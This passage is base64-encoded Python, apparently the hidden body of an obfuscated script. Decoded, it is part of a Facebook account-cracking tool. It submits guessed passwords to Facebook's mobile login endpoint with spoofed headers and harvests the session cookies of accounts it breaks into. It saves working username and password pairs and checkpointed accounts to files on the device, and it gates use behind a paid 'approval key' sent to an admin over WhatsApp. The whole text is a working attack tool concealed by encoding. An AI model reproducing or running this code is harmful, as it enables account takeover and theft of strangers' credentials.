2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgIyAnY29va2llJzogJ2RhdHI9endhaVk4b0lwUkptdXNmd2NVWVIzZ2NsOyBzYj16d2FpWTVYS0k2ZFl2ZGlBVDhNZklBekY7IHdkPTk3OXgxODMxOyBkcHI9Mi4zNDM3NTsgZnI9MEZHRmdEY0QyeDNNU1BFYkouLkJqb2diUC5GaC5BQUEuMC4wLkJqdDdqcS5BV1h2ZWdocC1BSScsDQogICAgICAgICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLA0KICAgICAgICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLA0KICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLA0KICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywNCiAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLA0KICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAndXNlci1hZ2VudCc6IHByb30NCiAgICAgICAgICAgIGxvID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL2xvZ2luL2FzeW5jLz9yZWZzcmM9ZGVwcmVjYXRlZCZsd3Y9MTAwJyxkYXRhPWxvZ19kYXRhLGhlYWRlcnM9aGVhZGVyX2ZyZWVmYikudGV4dA0KICAgICAgICAgICAgbG9nX2Nvb2tpZXM9c2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkua2V5cygpDQogICAgICAgICAgICBpZiAnY191c2VyJyBpbiBsb2dfY29va2llczoNCiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgY2lkID0gY29raVs3OjIyXQ0KICAgICAgICAgICAgICAgIHByaW50KCdcclxyIFwwMzNbMzg7NTsxOTZtW1wwMzNbMzg7NTs0NfCdkI/wnZCI8J2QjfCdkIjwnZCKLfCdkJLwnZCH8J2QgPCdkJbwnZCO8J2QjfCfjLpcMDMzWzM4OzU7MTk2bV0gXDAzM1szODs1OzQ2bScrdWlkKydcMDMzWzM4OzU7MTk2bSB8IFwwMzNbMzg7NTs0Nm0nICtwcysgICAgJyAgXG5cMDMzWzM4OzU7MTk2bVtcMDMzWzA7OTNtIFtcMDMzWzM4OzU7NDZtQ09PS0lFLfCfpJZcMDMzWzM4OzU7MTk2bV0gPSBcMDMzWzM4OzU7MTk1bScrY29raSsgICcgICcnICBcMDMzWzA7OTdtJykNCiAgICAgICAgICAgICAgICBjZWtfYXBrKHNlc3Npb24sY29raSkNCiAgICAgICAgICAgICAgICBvcGVuKCcvc2RjYXJkL/CdkI/wnZCI8J2QjfCdkIjwnZCKLfCdkJLwnZCH8J2QgPCdkJbwnZCO8J2QjS1PSy50eHQnLCAnYScpLndyaXRlKCB1aWQrJyB8ICcrcHMrJ1xuJykNCiAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxpZiAnY2hlY2twb2ludCcgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbMjQ6MzldDQogICAgICAgICAgICAgICAgI3ByaW50KCdcclxyXDMzWzE7MzBtW/CdkI/wnZCI8J2QjfCdkIjwnZCKLfCdkJLwnZCH8J2QgPCdkJbwnZCO8J2QjS1DUF0gJyArdWlkKyAnIHwgJyArcHMrICAgICAgICAgICAnICBcMzNbMDs5N20nKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQv8J2Qj/CdkIjwnZCN8J2QiPCdkIot8J2QkvCdkIfwnZCA8J2QlvCdkI7wnZCNLUNQLnR4dCcsICdhJykud3JpdGUoIHVpZCsnIHwgJytwcysnIFxuJykNCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBsb29wKz0xDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcclxyJXN7eH0gW3t4cn3wnZCP8J2QiPCdkI3wnZCI8J2Qii3wnZCS8J2Qh/CdkIDwnZCW8J2QjvCdkI17eH1dWyVzfCVzXVtPSzp7eHJ9JXN7eH1dJyUoSCxsb29wLHRsLGxlbihva3MpKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KICAgICAgICANCmRlZiBzdXBlcnVzZXIoKToNCiAgICB1dWlkID0gc3RyKG9zLmdldGV1aWQoKSkgKyBzdHIob3MuZ2V0bG9naW4oKSkgDQogICAgaWQgPSAiNzEiLmpvaW4odXVpZCkNCiAgICBwcmludChsb2dvKQ0KICAgIERBUks9cmVxdWVzdHMuZ2V0KCJodHRwczovL2dpdGh1Yi5jb20vTWVoZWRpNTc5MC9hcHJiYWxjb2x0b2wvYmxvYi9tYWluL3NoYXdvbi50eHQiKS50ZXh0DQogICAgaWYgaWQgaW4gREFSSzoNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIHByaW50KGxvZ28pDQogICAgICAgIHh4cigpDQogICAgZWxzZToNCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIHByaW50KGxvZ28pDQogICAgICAgIHByaW50KCJcdCBcMDMzWzE7MzJtIEZpcnN0IEdldCBBcHByb3ZlbFwwMzNbMTszN20gIikNCiAgICAgICAgdGltZS5zbGVlcCgxKQ0KICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICAgICAgcHJpbnQobG9nbykNCiAgICAgICAgcHJpbnQgKCIiKQ0KICAgICAgICBwcmludCgiWW91IE5lZWQgR2V0IEFwcHJvdmVkIEZpcnN0XDAzM1sxOzM3bVxuIikNCiAgICAgICAgcHJpbnQoIiBcMDMzWzE7MzJtIE5vdGUgOiBUaGF0IGlzIFBhaWQgYmVjYXVzZSA4MCUgb2sgaWQganVzdCBub3cgbG9naW5cMDMzWzE7MzdtIikNCiAgICAgICAgcHJpbnQgKCIiKQ0KICAgICAgICBwcmludCgiIFlvdXIgS2V5IGlzIE5vdCBBcHByb3ZlZCAiKQ0KICAgICAgICBwcmludCgiIikNCiAgICAgICAgcHJpbnQoIiBDb3B5IEFuZCBTZW5kIEtleSBUbyBBZG1pbiIpDQogICAgICAgIHByaW50ICgiIikNCiAgICAgICAgcHJpbnQgKCIgWW91ciBLZXkgOiAiK1VNTyt0dHQraWQpDQogICAgICAgIHByaW50ICgiIikNCiAgICAgICAgbmFtZSA9IGlucHV0KCIgWW91ciBOYW1lIDogIikNCiAgICAgICAgcHJpbnQgKCIiKQ0KICAgICAgICBpbnB1dCgiIFByZXNzIEVudGVyIFRvIFNlbmQgS2V5IikNCiAgICAgICAgdGltZS5zbGVlcCgzLjUpDQogICAgICAgIHRrcyA9ICdEZWFyJTIwQWRtaW4sJTIwUGxlYXNlJTIwQXBwcm92ZWQlMjBNeSUyMEtleSUyMFRvJTIwUHJlbWl1bSUyMCUyMFRoYW5rcyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyME15JTIwTmFtZSUyMDolMjAnK25hbWUrJyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyME15JTIwJTIwS2V5JTIwJTIwOiUyMCcrVU1PK3R0dCtpZA0KICAgICAgICBvcy5zeXN0ZW0oJ2FtIHN0YXJ0IGh0dHBzOi8vd2EubWUvKzg4MDE2MTU4MTgyMzg/dGV4dD0nICsgdGtzKQ0KICAgICAgICBzdXBlcnVzZXIoKSAgICAgICAgDQpzdXBlcnVzZXIoKQ0KDQogICAg"))
